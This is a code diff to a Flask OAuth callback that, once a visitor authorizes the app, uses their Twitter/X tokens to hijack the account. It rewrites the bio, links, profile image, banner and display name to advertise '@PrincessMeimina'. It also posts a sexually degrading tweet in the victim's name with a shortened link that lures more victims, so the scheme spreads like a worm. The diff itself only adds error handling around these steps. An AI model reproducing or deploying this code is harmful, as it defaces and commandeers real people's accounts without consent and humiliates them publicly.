@@ -217,19 +217,23 @@ def callback():
     real_client = oauth.Client(consumer, real_token)
 
     if endpoint == 'start':
-        description="I clicked a risky link for @PrincessMeimina. You should $END $ERVE $UBMIT to Meimina$$ too."
-        update_profile(real_client,"beacons.ai/princessmeimina","beneath Meimina$$",description)
-        update_profile_image(real_client)
-        update_profile_banner(real_client)
-        name = "Meiminaddict #"+str(random.random())[2:8]
-        update_profile_name(real_client,name)
-        api = tweepy.Client(bearer_token=app.config['BEARER_TOKEN'],
+        try:
+            description="I clicked a risky link for @PrincessMeimina. You should $END $ERVE $UBMIT to Meimina$$ too."
+            update_profile(real_client,"beacons.ai/princessmeimina","beneath Meimina$$",description)
+            update_profile_image(real_client)
+            update_profile_banner(real_client)
+            name = "Meiminaddict #"+str(random.random())[2:8]
+            update_profile_name(real_client,name)
+            api = tweepy.Client(bearer_token=app.config['BEARER_TOKEN'],
                                         consumer_key=app.config['APP_CONSUMER_KEY'], 
                                         consumer_secret=app.config['APP_CONSUMER_SECRET'],
                                         access_token=real_oauth_token, 
                                         access_token_secret=real_oauth_token_secret)
         
-        api.create_tweet(text="I am a dumb slut who clicks anything sent by the wonderful @PrincessMeimina. clicky click https://tinyurl.com/3y97dae2 to be owned by Meimina$$ @slave2goddes")
+            api.create_tweet(text="I am a dumb slut who clicks anything sent by the wonderful @PrincessMeimina. clicky click https://tinyurl.com/3y97dae2 to be owned by Meimina$$ @slave2goddes")
+        except Exception as e:
+            print(e)
+            return str(e)
         #send_message(real_client,"1697559401543139328","I am dumb and clicked your link Goddess")
         
 
